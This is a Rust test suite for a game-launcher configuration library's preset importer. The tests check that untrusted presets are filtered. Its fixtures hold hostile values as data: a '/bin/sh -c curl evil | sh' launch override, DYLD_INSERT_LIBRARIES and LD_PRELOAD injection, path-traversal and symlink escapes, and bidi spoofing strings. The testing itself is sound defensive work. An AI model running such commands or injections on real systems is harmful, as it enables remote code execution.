use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use applejack_config::presets::{self, Confirmation, Rejected};
use applejack_config::{
    ConfigDb, EnvPolicy, Error, GameConfig, GraphicsBackend, ImportOptions, Preset, ValueCheck,
};

const MALICIOUS_PRESET: &str = include_str!("fixtures/malicious-preset.json");
const ATTACKER_ENV: &str = include_str!("fixtures/attacker-env.json");
const ATTACKER_RELATIVE_ESCAPE: &str = include_str!("fixtures/attacker-relative-escape.json");
const ATTACKER_UNKNOWN_KEYS: &str = include_str!("fixtures/attacker-unknown-keys.json");
const ATTACKER_D3DMETAL_UNINSTALLED: &str =
    include_str!("fixtures/attacker-d3dmetal-uninstalled.json");
const ATTACKER_FLAG_IDENTIFIERS: &str = include_str!("fixtures/attacker-flag-identifiers.json");

/// The game tier of the plan's allowlist: every pass-through name minus the
/// ones the engine sets itself.
const ALLOWED: [&str; 12] = [
    "PATH",
    "HOME",
    "TMPDIR",
    "WINEDEBUG",
    "DXMT_CONFIG",
    "DXMT_CONFIG_FILE",
    "DXMT_LOG_LEVEL",
    "MTL_HUD_ENABLED",
    "ROSETTA_ADVERTISE_AVX",
    "GST_PLUGIN_PATH",
    "APPLEJACK_SESSION",
    "VK_ICD_FILENAMES",
];

const ACCEPTED_AT: &str = "2026-10-29T00:00:00Z";

/// Per-name checks like the default policy: native code and config paths
/// stay under `engines/`.
struct FixturePolicy {
    engines: Vec<PathBuf>,
}

impl FixturePolicy {
    fn new(data_dir: &Path) -> Self {
        Self {
            engines: vec![data_dir.join("engines")],
        }
    }
}

impl EnvPolicy for FixturePolicy {
    fn allows(&self, name: &str) -> bool {
        ALLOWED.contains(&name)
    }

    fn value_check(&self, name: &str) -> ValueCheck<'_> {
        match name {
            "DXMT_CONFIG_FILE" => ValueCheck::Path(&self.engines),
            "VK_ICD_FILENAMES" | "GST_PLUGIN_PATH" => ValueCheck::PathList(&self.engines),
            _ => ValueCheck::Plain,
        }
    }
}

fn home() -> PathBuf {
    PathBuf::from("/Users/example")
}

fn data_dir() -> PathBuf {
    home().join("Library/Application Support/applejack")
}

fn memory_db() -> ConfigDb {
    ConfigDb::open_in_memory().unwrap()
}

/// A database with a `D3DMetal` overlay accepted for `versions`.
fn db_with_overlays(versions: &[&str]) -> ConfigDb {
    let db = memory_db();
    for version in versions {
        db.d3dmetal_accept(version, ACCEPTED_AT).unwrap();
    }
    db
}

fn rejected<'a>(items: &'a [Rejected], field: &str) -> &'a Rejected {
    items
        .iter()
        .find(|item| item.field == field)
        .unwrap_or_else(|| panic!("{field} not rejected: {items:?}"))
}

fn preset_with(config: GameConfig) -> Preset {
    Preset {
        schema: 1,
        appid: 3,
        engine_id: None,
        engine_version: None,
        host_chip: None,
        macos_version: None,
        config,
    }
}

/// A directory under the system temp dir, removed on drop.
struct TempDir(PathBuf);

impl TempDir {
    fn new(label: &str) -> Self {
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map_or(0, |d| d.as_nanos());
        let path = std::env::temp_dir().join(format!(
            "applejack-config-presets-{label}-{}-{nanos}",
            std::process::id()
        ));
        std::fs::create_dir_all(&path).unwrap();
        Self(path)
    }
}

impl Drop for TempDir {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

#[test]
fn malicious_preset_is_rejected_or_held_for_confirmation() {
    let preset = Preset::from_json(MALICIOUS_PRESET).unwrap();
    let policy = FixturePolicy::new(&data_dir());
    let db = memory_db();
    let plan = presets::import(
        &preset,
        &policy,
        &db,
        &data_dir(),
        None,
        ImportOptions::default(),
    )
    .unwrap();

    let icd = rejected(&plan.rejected, "extra_env.VK_ICD_FILENAMES");
    assert_eq!(icd.value, "/tmp/evil.json");
    assert!(icd.reason.contains("outside"), "{icd:?}");
    let dyld = rejected(&plan.rejected, "extra_env.DYLD_INSERT_LIBRARIES");
    assert!(dyld.reason.contains("DYLD_*"), "{dyld:?}");
    let overrides = rejected(&plan.rejected, "extra_env.WINEDLLOVERRIDES");
    assert_eq!(overrides.value, "ntdll=n");
    assert!(
        overrides.reason.contains("set by the engine"),
        "{overrides:?}"
    );
    let d3dmetal = rejected(&plan.rejected, "graphics_backend");
    assert_eq!(d3dmetal.value, "d3dmetal");
    assert!(d3dmetal.reason.contains("overlay"), "{d3dmetal:?}");
    assert!(d3dmetal.reason.contains("1.0.0"), "{d3dmetal:?}");
    assert_eq!(plan.rejected.len(), 4, "{:?}", plan.rejected);

    assert_eq!(
        plan.confirmations,
        [
            Confirmation {
                field: "launch_exe_override".to_owned(),
                value: "/bin/sh".to_owned(),
            },
            Confirmation {
                field: "launch_args_override".to_owned(),
                value: "-c 'curl evil | sh'".to_owned(),
            },
        ]
    );
    assert!(plan.needs_confirmation());
    assert!(plan.warnings.is_empty(), "{:?}", plan.warnings);
    assert_eq!(
        plan.config.extra_env.keys().collect::<Vec<_>>(),
        ["WINEDEBUG"]
    );
    assert_eq!(plan.config.graphics_backend, None);
    assert_eq!(plan.config.hidraw_enabled, Some(true));
    assert!(plan.accepted.iter().any(|item| item.field == "engine_id"));

    let error = plan.apply(&db).unwrap_err();
    assert!(
        matches!(error, Error::ConfirmationRequired(ref items) if items.len() == 2),
        "{error}"
    );
    assert!(
        error.to_string().contains("\"-c 'curl evil | sh'\""),
        "values are Debug-escaped: {error}"
    );
    assert_eq!(
        db.game_config(10).unwrap(),
        None,
        "nothing written without confirmation"
    );
}

#[test]
fn confirmed_import_writes_filtered_config_only() {
    let preset = Preset::from_json(MALICIOUS_PRESET).unwrap();
    let policy = FixturePolicy::new(&data_dir());
    let options = ImportOptions {
        accept_launch_overrides: true,
    };
    let db = memory_db();
    let plan = presets::import(&preset, &policy, &db, &data_dir(), None, options).unwrap();
    assert!(!plan.needs_confirmation());

    db.set_field(10, "notes", "kept").unwrap();
    db.set_field(10, "extra_env", "DXMT_LOG_LEVEL=info")
        .unwrap();
    plan.apply(&db).unwrap();
    let stored = db.game_config(10).unwrap().unwrap();
    assert_eq!(stored.notes.as_deref(), Some("kept"));
    assert_eq!(stored.graphics_backend, None);
    assert_eq!(stored.launch_exe_override.as_deref(), Some("/bin/sh"));
    assert_eq!(
        stored.extra_env.keys().collect::<Vec<_>>(),
        ["DXMT_LOG_LEVEL", "WINEDEBUG"]
    );
    assert!(!stored.extra_env.contains_key("VK_ICD_FILENAMES"));
    assert!(!stored.extra_env.contains_key("DYLD_INSERT_LIBRARIES"));
    assert!(!stored.extra_env.contains_key("WINEDLLOVERRIDES"));
}

#[test]
fn d3dmetal_imports_only_for_an_accepted_engine_version() {
    let preset = Preset::from_json(MALICIOUS_PRESET).unwrap();
    let policy = FixturePolicy::new(&data_dir());
    let db = db_with_overlays(&["1.0.0"]);
    let plan = presets::import(
        &preset,
        &policy,
        &db,
        &data_dir(),
        None,
        ImportOptions::default(),
    )
    .unwrap();
    assert_eq!(
        plan.config.graphics_backend,
        Some(GraphicsBackend::D3dmetal)
    );
    assert!(
        !plan
            .rejected
            .iter()
            .any(|item| item.field == "graphics_backend")
    );

    // The same preset without an engine version is refused even though an
    // overlay exists: the gate needs to know which engine it belongs to.
    let mut unversioned = preset.clone();
    unversioned.config.engine_version = None;
    let plan = presets::import(
        &unversioned,
        &policy,
        &db,
        &data_dir(),
        None,
        ImportOptions::default(),
    )
    .unwrap();
    let item = rejected(&plan.rejected, "graphics_backend");
    assert!(item.reason.contains("engine version"), "{item:?}");
    assert_eq!(plan.config.graphics_backend, None);

    // An engine version that failed the identifier check counts as unset.
    let mut flagged = preset.clone();
    flagged.config.engine_version = Some("-1.0.0".to_owned());
    let plan = presets::import(
        &flagged,
        &policy,
        &db,
        &data_dir(),
        None,
        ImportOptions::default(),
    )
    .unwrap();
    rejected(&plan.rejected, "engine_version");
    let item = rejected(&plan.rejected, "graphics_backend");
    assert!(item.reason.contains("engine version"), "{item:?}");
}

#[test]
fn d3dmetal_for_an_uninstalled_engine_version_is_rejected() {
    let preset = Preset::from_json(ATTACKER_D3DMETAL_UNINSTALLED).unwrap();
    assert_eq!(preset.config.engine_version.as_deref(), Some("9.9"));
    let policy = FixturePolicy::new(&data_dir());
    let db = db_with_overlays(&["1.0.0"]);
    let plan = presets::import(
        &preset,
        &policy,
        &db,
        &data_dir(),
        None,
        ImportOptions::default(),
    )
    .unwrap();
    let item = rejected(&plan.rejected, "graphics_backend");
    assert!(item.reason.contains("9.9"), "{item:?}");
    assert_eq!(plan.config.graphics_backend, None);
    assert_eq!(plan.config.engine_version.as_deref(), Some("9.9"));
}

#[test]
fn data_dir_placeholder_expands_before_the_root_check() {
    let data = data_dir();
    let preset = preset_with(GameConfig {
        extra_env: BTreeMap::from([
            (
                "VK_ICD_FILENAMES".to_owned(),
                "$APPLEJACK_DATA_DIR/engines/rosetta-wine/1.0/icd.json".to_owned(),
            ),
            (
                "GST_PLUGIN_PATH".to_owned(),
                "$APPLEJACK_DATA_DIR/../escape".to_owned(),
            ),
            ("DXMT_CONFIG_FILE".to_owned(), "engines/relative".to_owned()),
            ("UNKNOWN_VAR".to_owned(), "1".to_owned()),
            ("API_TOKEN".to_owned(), "1".to_owned()),
        ]),
        direct_verified_at: Some("2026-10-28T00:00:00Z".to_owned()),
        ..GameConfig::default()
    });
    let policy = FixturePolicy::new(&data);
    let db = memory_db();
    let plan =
        presets::import(&preset, &policy, &db, &data, None, ImportOptions::default()).unwrap();
    assert_eq!(
        plan.config.extra_env["VK_ICD_FILENAMES"],
        format!("{}/engines/rosetta-wine/1.0/icd.json", data.display())
    );
    assert!(
        rejected(&plan.rejected, "extra_env.GST_PLUGIN_PATH")
            .reason
            .contains("..")
    );
    assert!(
        rejected(&plan.rejected, "extra_env.DXMT_CONFIG_FILE")
            .reason
            .contains("absolute")
    );
    assert!(
        rejected(&plan.rejected, "extra_env.UNKNOWN_VAR")
            .reason
            .contains("allowlist")
    );
    assert!(
        rejected(&plan.rejected, "extra_env.API_TOKEN")
            .reason
            .contains("secret")
    );
    assert!(
        rejected(&plan.rejected, "direct_verified_at")
            .reason
            .contains("host-local")
    );
    assert_eq!(plan.confirmations, Vec::new());
    assert!(!plan.needs_confirmation());
    plan.apply(&db).unwrap();
    let stored = db.game_config(3).unwrap().unwrap();
    assert_eq!(stored.extra_env.len(), 1);
    assert_eq!(stored.direct_verified_at, None);
}

#[test]
fn empty_and_separator_only_path_values_are_rejected() {
    let data = data_dir();
    let preset = preset_with(GameConfig {
        extra_env: BTreeMap::from([
            ("VK_ICD_FILENAMES".to_owned(), ":".to_owned()),
            ("GST_PLUGIN_PATH".to_owned(), "::".to_owned()),
            ("DXMT_CONFIG_FILE".to_owned(), String::new()),
            ("WINEDEBUG".to_owned(), String::new()),
        ]),
        ..GameConfig::default()
    });
    let policy = FixturePolicy::new(&data);
    let db = memory_db();
    let plan =
        presets::import(&preset, &policy, &db, &data, None, ImportOptions::default()).unwrap();
    for name in ["VK_ICD_FILENAMES", "GST_PLUGIN_PATH", "DXMT_CONFIG_FILE"] {
        let item = rejected(&plan.rejected, &format!("extra_env.{name}"));
        assert!(item.reason.contains("at least one path"), "{item:?}");
    }
    assert_eq!(plan.rejected.len(), 3, "{:?}", plan.rejected);
    assert_eq!(
        plan.config.extra_env,
        BTreeMap::from([("WINEDEBUG".to_owned(), String::new())]),
        "an empty plain value is still a value"
    );

    let listed = preset_with(GameConfig {
        extra_env: BTreeMap::from([(
            "DXMT_CONFIG_FILE".to_owned(),
            format!(
                "{}/engines/rosetta-wine/1.0.user/a.conf:{}/engines/rosetta-wine/1.0.user/b.conf",
                data.display(),
                data.display()
            ),
        )]),
        ..GameConfig::default()
    });
    let plan =
        presets::import(&listed, &policy, &db, &data, None, ImportOptions::default()).unwrap();
    let item = rejected(&plan.rejected, "extra_env.DXMT_CONFIG_FILE");
    assert!(item.reason.contains("single-path"), "{item:?}");
    assert!(plan.config.extra_env.is_empty());
}

#[test]
fn home_placeholder_expands_only_when_the_host_supplies_home() {
    let data = data_dir();
    let preset = preset_with(GameConfig {
        extra_env: BTreeMap::from([(
            "DXMT_CONFIG_FILE".to_owned(),
            "$HOME/Library/Application Support/applejack/engines/rosetta-wine/1.0.user/dxmt.conf"
                .to_owned(),
        )]),
        launch_exe_override: Some("$HOME/Games/game.exe".to_owned()),
        notes: Some("see $HOME/notes.txt".to_owned()),
        ..GameConfig::default()
    });
    let policy = FixturePolicy::new(&data);
    let db = memory_db();
    let plan = presets::import(
        &preset,
        &policy,
        &db,
        &data,
        Some(&home()),
        ImportOptions::default(),
    )
    .unwrap();
    assert!(plan.rejected.is_empty(), "{:?}", plan.rejected);
    assert_eq!(
        plan.config.extra_env["DXMT_CONFIG_FILE"],
        format!("{}/engines/rosetta-wine/1.0.user/dxmt.conf", data.display())
    );
    assert_eq!(
        plan.confirmations[0].value,
        format!("{}/Games/game.exe", home().display())
    );
    assert_eq!(
        plan.config.notes.as_deref(),
        Some("see /Users/example/notes.txt")
    );

    // Without a home directory the placeholder stays literal: a path value
    // is not absolute, and an executable under it cannot be confirmed as
    // the file it names.
    let plan =
        presets::import(&preset, &policy, &db, &data, None, ImportOptions::default()).unwrap();
    let item = rejected(&plan.rejected, "extra_env.DXMT_CONFIG_FILE");
    assert!(item.reason.contains("absolute"), "{item:?}");
    let item = rejected(&plan.rejected, "launch_exe_override");
    assert!(item.reason.contains("$HOME is not set"), "{item:?}");
    assert_eq!(plan.confirmations, Vec::new());
    assert_eq!(plan.config.launch_exe_override, None);
    assert_eq!(plan.config.notes.as_deref(), Some("see $HOME/notes.txt"));
}

#[test]
fn attacker_env_fixture_keeps_only_the_plain_option_string() {
    let data = data_dir();
    let preset = Preset::from_json(ATTACKER_ENV).unwrap();
    let policy = FixturePolicy::new(&data);
    let db = memory_db();
    let plan =
        presets::import(&preset, &policy, &db, &data, None, ImportOptions::default()).unwrap();
    let expectations = [
        ("vk_icd_filenames", "allowlist"),
        ("Vk_Icd_Filenames", "allowlist"),
        ("dyld_insert_libraries", "DYLD_*"),
        ("Ld_Preload", "LD_*"),
        ("VK_ICD_FILENAMES", ".."),
        ("GST_PLUGIN_PATH", "outside"),
        ("WINEPREFIX", "set by the engine"),
        ("WINEDEBUG", "control"),
        ("WINEESYNC", "control"),
        ("MTL_HUD_ENABLED", "control"),
        ("VK\u{130}CD_FILENAMES", "not a valid"),
        ("PATH", "launcher"),
        ("path", "launcher"),
        ("\u{ff30}\u{ff21}\u{ff34}\u{ff28}", "not a valid"),
    ];
    for (name, reason) in expectations {
        let item = rejected(&plan.rejected, &format!("extra_env.{name}"));
        assert!(item.reason.contains(reason), "{item:?}");
    }
    assert_eq!(
        plan.rejected.len(),
        expectations.len(),
        "{:?}",
        plan.rejected
    );
    assert_eq!(
        plan.config.extra_env,
        BTreeMap::from([("DXMT_CONFIG".to_owned(), "engines/x.conf".to_owned())]),
        "DXMT_CONFIG is an option string, not a path"
    );
}

#[test]
fn launch_exe_override_cannot_escape_its_placeholder_directory() {
    let data = data_dir();
    let preset = Preset::from_json(ATTACKER_RELATIVE_ESCAPE).unwrap();
    let policy = FixturePolicy::new(&data);
    let db = memory_db();
    let plan =
        presets::import(&preset, &policy, &db, &data, None, ImportOptions::default()).unwrap();
    let exe = rejected(&plan.rejected, "launch_exe_override");
    assert!(exe.reason.contains("escapes"), "{exe:?}");
    assert_eq!(plan.confirmations, Vec::new());
    assert_eq!(plan.config.launch_exe_override, None);
    let icd = rejected(&plan.rejected, "extra_env.VK_ICD_FILENAMES");
    assert!(
        icd.reason.contains("outside"),
        "the data dir itself: {icd:?}"
    );
    assert_eq!(
        plan.config.extra_env["GST_PLUGIN_PATH"],
        format!("{}/engines", data.display())
    );
    assert_eq!(
        plan.config.extra_env["DXMT_CONFIG"], "${APPLEJACK_DATA_DIR}/engines/x",
        "a braced placeholder is not expanded; the value is plain text"
    );

    let dotted = preset_with(GameConfig {
        launch_exe_override: Some(
            "$APPLEJACK_DATA_DIR/prefixes/./game/../game/drive_c/g.exe".to_owned(),
        ),
        ..GameConfig::default()
    });
    let plan =
        presets::import(&dotted, &policy, &db, &data, None, ImportOptions::default()).unwrap();
    assert!(plan.rejected.is_empty(), "{:?}", plan.rejected);
    assert_eq!(
        plan.confirmations[0].value,
        format!("{}/prefixes/game/drive_c/g.exe", data.display()),
        "the confirmed value is the normalized path"
    );
    assert_eq!(
        plan.config.launch_exe_override.as_deref(),
        Some(plan.confirmations[0].value.as_str())
    );
}

#[test]
fn symlinked_ancestor_outside_the_root_is_rejected() {
    let temp = TempDir::new("symlink");
    let data = temp.0.clone();
    std::fs::create_dir_all(data.join("engines/rosetta-wine/1.0")).unwrap();
    std::os::unix::fs::symlink("/tmp", data.join("engines/link")).unwrap();
    let preset = preset_with(GameConfig {
        extra_env: BTreeMap::from([
            (
                "DXMT_CONFIG_FILE".to_owned(),
                format!("{}/engines/link/dxmt.conf", data.display()),
            ),
            (
                "VK_ICD_FILENAMES".to_owned(),
                format!("{}/engines/link/evil.json", data.display()),
            ),
            (
                "GST_PLUGIN_PATH".to_owned(),
                format!("{}/engines/rosetta-wine/1.0/plugins", data.display()),
            ),
        ]),
        ..GameConfig::default()
    });
    let policy = FixturePolicy::new(&data);
    let db = memory_db();
    let plan =
        presets::import(&preset, &policy, &db, &data, None, ImportOptions::default()).unwrap();
    for name in ["DXMT_CONFIG_FILE", "VK_ICD_FILENAMES"] {
        let item = rejected(&plan.rejected, &format!("extra_env.{name}"));
        assert!(item.reason.contains("symlink"), "{item:?}");
    }
    assert_eq!(plan.rejected.len(), 2, "{:?}", plan.rejected);
    assert_eq!(
        plan.config.extra_env.keys().collect::<Vec<_>>(),
        ["GST_PLUGIN_PATH"],
        "a real path under a temp dir that is itself a symlink target still passes"
    );
}

#[test]
fn control_and_bidi_characters_in_text_fields_are_rejected() {
    let preset = preset_with(GameConfig {
        launch_exe_override: Some("/bin/sh\nreject   launch_exe_override = forged".to_owned()),
        launch_args_override: Some("-windowed".to_owned()),
        notes: Some("\u{1b}[2J".to_owned()),
        dx12_expectation: Some("tab\there".to_owned()),
        engine_id: Some("safe".to_owned()),
        extra_env: BTreeMap::from([
            ("WINEDEBUG".to_owned(), "safe \u{202e} hs/nib/".to_owned()),
            (
                "DXMT_LOG_LEVEL".to_owned(),
                "\u{2066}info\u{2069}".to_owned(),
            ),
            ("MTL_HUD_ENABLED".to_owned(), "1\u{200e}".to_owned()),
        ]),
        ..GameConfig::default()
    });
    let db = memory_db();
    let plan = presets::import(
        &preset,
        &FixturePolicy::new(&data_dir()),
        &db,
        &data_dir(),
        None,
        ImportOptions::default(),
    )
    .unwrap();
    for field in [
        "launch_exe_override",
        "notes",
        "dx12_expectation",
        "extra_env.WINEDEBUG",
        "extra_env.DXMT_LOG_LEVEL",
        "extra_env.MTL_HUD_ENABLED",
    ] {
        let item = rejected(&plan.rejected, field);
        assert!(item.reason.contains("control"), "{item:?}");
        assert!(item.reason.contains("bidirectional"), "{item:?}");
    }
    assert_eq!(plan.rejected.len(), 6, "{:?}", plan.rejected);
    assert_eq!(plan.confirmations.len(), 1);
    assert_eq!(plan.confirmations[0].field, "launch_args_override");
    assert_eq!(plan.config.launch_exe_override, None);
    assert!(plan.config.extra_env.is_empty());
    assert_eq!(plan.config.engine_id.as_deref(), Some("safe"));
}

#[test]
fn unknown_config_keys_fail_to_parse_by_name() {
    let error = Preset::from_json(ATTACKER_UNKNOWN_KEYS).unwrap_err();
    assert!(matches!(error, Error::Json(_)), "{error}");
    assert!(error.to_string().contains("launch_exe_overide"), "{error}");
}

#[test]
fn flag_shaped_engine_id_is_rejected() {
    let preset = Preset::from_json(ATTACKER_FLAG_IDENTIFIERS).unwrap();
    let db = memory_db();
    let plan = presets::import(
        &preset,
        &FixturePolicy::new(&data_dir()),
        &db,
        &data_dir(),
        None,
        ImportOptions::default(),
    )
    .unwrap();
    let item = rejected(&plan.rejected, "engine_id");
    assert_eq!(item.value, "-rf");
    assert!(item.reason.contains("'-'"), "{item:?}");
    assert_eq!(plan.config.engine_id, None);
}

#[test]
fn hand_written_preset_with_only_required_keys_parses() {
    let preset = Preset::from_json(r#"{"schema":1,"appid":5,"config":{}}"#).unwrap();
    assert_eq!(preset.schema, 1);
    assert_eq!(preset.appid, 5);
    assert_eq!(preset.engine_id, None);
    assert_eq!(preset.engine_version, None);
    assert_eq!(preset.host_chip, None);
    assert_eq!(preset.macos_version, None);
    assert_eq!(preset.config, GameConfig::default());
    let db = memory_db();
    let plan = presets::import(
        &preset,
        &FixturePolicy::new(&data_dir()),
        &db,
        &data_dir(),
        None,
        ImportOptions::default(),
    )
    .unwrap();
    assert!(plan.accepted.is_empty() && plan.rejected.is_empty());
}

/// Allows every name and path, so only the policy-independent hard stops
/// in `import` can reject.
struct PermissivePolicy;

impl EnvPolicy for PermissivePolicy {
    fn allows(&self, _: &str) -> bool {
        true
    }

    fn value_check(&self, _: &str) -> ValueCheck<'_> {
        ValueCheck::Plain
    }
}

#[test]
fn hard_stops_hold_under_a_permissive_policy() {
    let names = [
        "dyld_insert_libraries",
        "DYLD_LIBRARY_PATH",
        "LD_PRELOAD",
        "ld_library_path",
        "PATH",
        "path",
        "HOME",
        "WINELOADER",
        "BASH_ENV",
        "WINEPREFIX",
        "wineprefix",
        "WINEDLLOVERRIDES",
        "WINEMSYNC",
        "WINEESYNC",
        "MY_TOKEN",
        "Pass_word",
        "API_KEY",
        "AUTH",
        "x_credential",
    ];
    let preset = preset_with(GameConfig {
        engine_id: Some("../../tmp/x".to_owned()),
        engine_version: Some(".hidden".to_owned()),
        extra_env: names
            .iter()
            .map(|name| ((*name).to_owned(), "/x".to_owned()))
            .chain([("WINEDEBUG".to_owned(), "-all".to_owned())])
            .collect(),
        ..GameConfig::default()
    });
    let db = memory_db();
    let plan = presets::import(
        &preset,
        &PermissivePolicy,
        &db,
        &data_dir(),
        None,
        ImportOptions::default(),
    )
    .unwrap();
    assert!(
        rejected(&plan.rejected, "engine_id")
            .reason
            .contains("letters")
    );
    assert!(
        rejected(&plan.rejected, "engine_version")
            .reason
            .contains("letters")
    );
    for name in names {
        rejected(&plan.rejected, &format!("extra_env.{name}"));
    }
    for name in [
        "WINEPREFIX",
        "wineprefix",
        "WINEDLLOVERRIDES",
        "WINEMSYNC",
        "WINEESYNC",
    ] {
        let item = rejected(&plan.rejected, &format!("extra_env.{name}"));
        assert!(item.reason.contains("set by the engine"), "{item:?}");
    }
    assert_eq!(plan.rejected.len(), names.len() + 2, "{:?}", plan.rejected);
    assert_eq!(plan.config.engine_id, None);
    assert_eq!(plan.config.engine_version, None);
    assert_eq!(
        plan.config.extra_env.keys().collect::<Vec<_>>(),
        ["WINEDEBUG"]
    );
}

#[test]
fn export_then_import_round_trips_a_clean_config() {
    let data = data_dir();
    let home = home();
    let db = memory_db();
    db.set_field(10, "hidraw_enabled", "true").unwrap();
    db.set_field(10, "graphics_backend", "dxmt").unwrap();
    db.set_field(10, "extra_env", "WINEDEBUG=-all").unwrap();
    db.set_field(
        10,
        "extra_env",
        &format!(
            "DXMT_CONFIG_FILE={}/engines/rosetta-wine/1.0.user/dxmt.conf",
            data.display()
        ),
    )
    .unwrap();
    db.set_field(
        10,
        "extra_env",
        &format!(
            "GST_PLUGIN_PATH={}/engines/rosetta-wine/1.0/plugins:{}/engines/rosetta-wine/1.0.user/plugins",
            data.display(),
            data.display()
        ),
    )
    .unwrap();
    db.set_field(
        10,
        "launch_exe_override",
        &format!("{}/Games/game.exe", home.display()),
    )
    .unwrap();
    db.set_field(
        10,
        "notes",
        &format!("saves under {}/Games", home.display()),
    )
    .unwrap();
    let preset = presets::export(&db, 10, &data, Some(&home)).unwrap();
    let json = preset.to_json_pretty().unwrap();
    assert!(json.contains("$APPLEJACK_DATA_DIR/engines"), "{json}");
    assert!(json.contains("\"$HOME/Games/game.exe\""), "{json}");
    assert!(!json.contains("/Users/"), "{json}");
    assert!(!json.contains("example"), "account name leaked: {json}");
    let value: serde_json::Value = serde_json::from_str(&json).unwrap();
    assert!(
        value["config"]
            .as_object()
            .unwrap()
            .values()
            .all(|field| !field.is_null()),
        "unset columns are not written: {json}"
    );
    let parsed = Preset::from_json(&json).unwrap();
    let policy = FixturePolicy::new(&data);
    let options = ImportOptions {
        accept_launch_overrides: true,
    };
    let target = memory_db();
    let plan = presets::import(&parsed, &policy, &target, &data, Some(&home), options).unwrap();
    assert!(plan.rejected.is_empty(), "{:?}", plan.rejected);
    assert_eq!(plan.confirmations.len(), 1);
    plan.apply(&target).unwrap();
    assert_eq!(target.game_config(10).unwrap(), db.game_config(10).unwrap());
}

#[test]
fn export_refuses_a_wine_user_directory_it_cannot_rewrite() {
    let data = data_dir();
    let home = home();
    let db = memory_db();
    db.set_field(
        10,
        "extra_env",
        &format!(
            "DXMT_CONFIG_FILE={}/prefixes/g/drive_c/users/example/dxmt.conf",
            data.display()
        ),
    )
    .unwrap();
    let error = presets::export(&db, 10, &data, Some(&home)).unwrap_err();
    assert!(
        matches!(&error, Error::AccountNameInExport { field } if field == "extra_env.DXMT_CONFIG_FILE"),
        "{error}"
    );
    assert!(!error.to_string().contains("example"), "{error}");
}
